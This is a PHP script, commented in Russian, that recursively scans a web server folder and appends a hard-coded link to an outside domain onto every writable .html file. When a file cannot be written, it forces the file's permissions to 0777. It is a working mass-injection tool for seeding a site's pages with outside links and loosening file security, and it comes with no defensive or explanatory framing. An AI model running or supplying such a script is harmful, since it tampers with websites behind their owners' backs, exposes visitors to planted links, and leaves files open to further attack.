<?
$extension = '.html';
$path = $_SERVER['DOCUMENT_ROOT'].'/q/filechange';
$code = '<a href="http://xtoolza.info/q/test.php">somecode</a>';
$close_tag = '</body>';
$mode_new = '0777';
$mode_old = '';


//get all files with $extension
function glob_recursive($dir, $mask){
  foreach(glob($dir.'/*') as $filename){
      if(strtolower(substr($filename, strlen($filename)-strlen($mask), strlen($mask)))==strtolower($mask)){
        if (is_writable($filename)) { //проверяем можно ли записать в файл
          echo '<br />'.$filename . ' - файл записываемый';
          $fileopen = fopen($filename, "a+");
          if(fwrite($fileopen, $code)){
            echo '<br />'.$filename . ' обновлен';
          } else {
            echo '<br />'.$filename . ' не удалось обновить';
          }
          fclose($fileopen);
        } else {
          if(!chmod($filename, 0777)){ //пытаемсы поменять права на файл
            echo '<br />cant change permissions to '.$filename . '';
          };
          if(is_writable($filename)){
            echo '<br />'.$filename . ' - теперь файл записываемый';
          }
        }
      }
      if(is_dir($filename)) {
        glob_recursive($filename, $mask);
      }
  }
}
$filelist = glob_recursive($path, $extension); //debug get files







//global debug
function debugger(){
  $debug = 1;
  if($debug === 1) {
      header("Content-Type: text/html; charset=utf-8");
      error_reporting(E_ALL);
      ini_set('display_errors', 1);
  }else{
      error_reporting( 0 );
  }
}
debugger();



























echo '<br>end';
?>
